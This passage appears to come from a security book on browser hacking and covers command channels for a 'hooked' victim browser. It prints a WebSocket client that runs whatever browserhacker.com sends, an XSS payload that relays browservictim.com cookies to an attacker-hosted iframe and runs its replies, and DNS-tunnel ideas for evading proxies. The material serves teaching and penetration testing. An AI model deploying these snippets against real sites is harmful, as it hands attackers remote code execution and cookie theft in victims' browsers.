
The client-side code is written in JavaScript using the native WebSocket API. When the WebSocket channel is open, the client sends a message to the server, asking for more commands. When the server replies, the onmessage event is triggered, and the data coming from the server is executed, creating a new Function object. The data flowing through the WebSocket channel can be a String, Blob, or ArrayBuffer type. In this case, the type is String, which means the code needs to be evaluated through the process of instantiating it with new Function(). We’ve assumed the attacker server and the JavaScript code that is sent are implicitly trusted, so using Function in this way is relatively safer than using eval.

```
var socket = new WebSocket("ws://browserhacker.com:6666/");
socket.onopen = function(){
  console.log("Socket open.");
  socket.send("Server, send me commands.");
}  
socket.onmessage = function(msg){
  f = new Function(msg.data);
  f();
  console.log("Command received and executed.");
} 
```

As you saw in [Figure 3-2](#c03.html#figure3-2), not every browser supports the WebSocket API natively. Say by default you’re using XMLHttpRequest objects as the default communication channel in order to support more browsers, but you wanted to upgrade a particular channel to use the WebSocket protocol. First, you need to determine if the WebSocket protocol is supported. To check that it is supported you would need to fingerprint the browser’s capability. Various techniques to achieve accurate and extensive browser fingerprinting are discussed in the Fingerprinting Browsers section of Chapter 6; however, you can determine if either the WebSocket API or Mozilla’s MozWebSocket is supported with the following code:

```
hasWebSocket: function() {
  return !!window.WebSocket || !!window.MozWebSocket;
},
```

If this returns true, you’re able to use the WebSocket protocol in your JavaScript. The MozWebSocket object is similar to the WebSocket object with a prefix, added by Mozilla in some older versions of Firefox (versions 6 to 10). The standard WebSocket object can be used without the need for a prefix from Firefox version 11.

## Using Messaging Communication

As introduced in Chapter 1, window.postMessage() is another native method to achieve cross-origin communication, while respecting the SOP. Using this method requires setup; first, you need to host content for an IFrame on your attacking server, in this example browserhacker.com:

```
<html>
<body>
<b>Embed me on a different origin</b>
<div id="debug">Ready to receive data...</div>
 <script>
     window.addEventListener("message", receiveMessage, false);
     function doClick() {
         parent.postMessage("Message sent from " + location.host,
           "http://browservictim.com");
     }
     var debug = document.getElementById("debug");
     function receiveMessage(event) {
         debug.innerHTML += "Data: " + event.data + "\n Origin: " +
          event.origin;
         parent.postMessage("alert(1)", event.origin);
     }
 </script>
</body>
</html>
```

Next, you need to exploit an XSS vulnerability on the target’s site, let’s say browservictim.com. The payload that has been injected requires JavaScript logic plus the IFrame itself. The created IFrame loads the previous code snippet. Note the to_server IFrame and the post_msg() and receiveMessage() functions here:

```
<div id="debug"> </div>
  <div id="ui">
    <input type="text" id="v" />
    <input type="button" value="Send to server" onclick="post_msg();" />
    <iframe id="to_server"
     src="http://browserhacker.com/postMessage_server.html"></iframe>
   </div>
  <script type="text/javascript">
  window.addEventListener("message", receiveMessage, false);

  var infoBar = document.getElementById("debug");
  function receiveMessage(event) {
    infoBar.innerHTML += event.origin + ": " + event.data + "";
    new Function(event.data)();
  }

  function post_msg(domain) {
        var to_server = document.getElementById("to_server");
        to_server.contentWindow.postMessage("" + 
          eval(document.getElementById("v").value), 
            "http://browserhacker.com");
  }        
  </script>
```

You can see an example of the browservictim.com domain cookies that are sent to browserhacker.com in [Figure 3-3](#c03.html#figure3-3).

 start figure 

[**Figure 3-3:**](#c03.html#figureanchor3-3) Breakpoint on the framed attacker’s code

![c03f003.eps](image_fi/662090c03/c03f003.png)

 end figure 

After the code loaded from browserhacker.com receives the data from a different origin, it replies back with additional JavaScript code, which is evaluated by creating a new Function on browservictim.com. In the previous code sample a simple alert(1) was sent, as you can see in [Figure 3-4](#c03.html#figure3-4).

 start figure 

[**Figure 3-4:**](#c03.html#figureanchor3-4) The response is evaluated and the JavaScript is executed

![c03f004.tif](image_fi/662090c03/c03f004.png)

 end figure 

window.postMessage() can be useful to communicate between different windows, such as IFrames, pop-ups, and pop-unders, and generally tabs. As always, some quirks exist across browsers. In Internet Explorer 8 and above it is possible to use window.postMessage() for IFrames only, but not for other tabs or windows. For an overview of the postMessage() support across browsers, see [Figure 3-5](#c03.html#figure3-5).

 start figure 

[**Figure 3-5:**](#c03.html#figureanchor3-5) window.postMessage() support in common browsers

![c03f005.tif](image_fi/662090c03/c03f005.png)

 end figure 

Internet Explorer versions 8 to 10 only partially support postMessage(), whereas the WebSocket protocol is fully supported9. This is one of the main reasons you might want to consider using postMessage() as your primary communication channel (if the hooked browser is not Internet Explorer).

## Using DNS Tunnel Communication

Each of the previously discussed communication channels relies on the HTTP protocol. The WebSocket protocol is the exception, but its initial handshake still relies on an HTTP request that is interpreted by an HTTP server as an Upgrade10 request such as:

```
GET /ws HTTP/1.1
Host: browserhacker.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: http://browservictim.com
Sec-WebSocket-Version: 13
```

There is nothing wrong with this, unless you are hooking browsers without a direct connection, such as those behind an HTTP proxy that logs everything and potentially inspects the content. This is where a DNS-based communication channel might come in handy, together with other evasion techniques that can be used to reduce the likelihood of detection. Only a few security solutions monitor DNS requests,11 and often their effectiveness is challenged because most modern browsers use DNS prefetching. DNS prefetching is primarily used to improve the user experience by increasing the responsiveness of loading future resources.

Kenton Born presented research12 at BlackHat 2010 leveraging DNS covert channels from the browser itself. This method is effective when data needs to be extruded only one-way from the browser to the server. However, it becomes more complex if the communication is meant to be bidirectional.
